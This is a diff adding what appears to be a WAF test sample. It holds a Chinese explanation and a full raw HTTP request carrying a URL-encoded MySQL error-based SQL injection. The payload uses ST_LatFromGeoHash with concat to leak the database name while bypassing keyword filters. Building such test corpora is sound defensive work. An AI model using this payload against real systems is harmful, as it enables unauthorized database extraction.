@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_报错注入(等价关键字绕过)-06506286
+# 基于报错注入进行等价关键字绕过注入，该SQL注入语句的攻击目的是通过利用ST_LatFromGeoHash函数来获取数据库中的数据库名称。攻击手段是通过拼接字符串的方式构造一个恶意的GeoHash参数，将数据库名称作为其中一部分，并将其传递给ST_LatFromGeoHash函数。在该注入语句中，使用concat函数拼接字符串。通过拼接0x7e（代表波浪字符，即~）、(select database())（用于获取数据库名称）和0x7e，构造一个字符串参数，其中数据库名称被插入到字符串中。然后，将该字符串参数传递给ST_LatFromGeoHash函数，以触发注入攻击并获取数据库名称。
+GET /?id=1%20and%20ST_LatFromGeoHash%28concat%280x7e%2C%28select%20database%28%29%29%2C0x7e%29%29%20&bid=hd_tag_m8mv24am HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24am
+RM-PRO-Token: ed3b709c182792c73f9d9549454e09d3
+RM-PRO-Time: 1742808372086
+User-Agent: curl/7.83.1
+
